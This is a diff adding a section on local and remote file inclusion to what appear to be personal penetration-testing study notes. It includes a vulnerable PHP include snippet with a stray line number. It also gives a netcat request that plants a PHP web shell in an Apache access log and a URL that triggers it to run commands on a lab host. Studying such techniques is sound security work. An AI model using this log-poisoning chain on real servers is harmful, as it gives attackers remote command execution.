@@ -689,5 +689,25 @@ Cookies flags related to security: Secure (only send over encrypted connections)
 ### Directory/path traversal
 Most common indicator of vulnerability: file extensions in URL query strings. Then try to access other files.
 
+### File inclusion vulnerabilities
+Including a file into the application's running code. Local file inclusions (LFI) occur when the included file is loaded from the same web server. Remote file inclusions (RFI) occur when a file is loaded from an external source.
 
+Logs file LFI example: if you are able to include any local file, and you know where the log file is, just send a request to the server that includes the php script.
 
+On the app side:
+```
+<?php
+ $file = $_GET["file"]; 39 include $file; ?>
+```
+
+The request to poison log file:
+```
+kali@kali:~$ nc -nv 10.11.0.22 80
+(UNKNOWN) [10.11.0.22] 80 (http) open
+<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
+```
+
+Then exploit it. It seems that if the file contains some php inside it's already enough for php to run it (because the log has other garbage):
+```
+http://10.11.0.22/menu.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig
+```
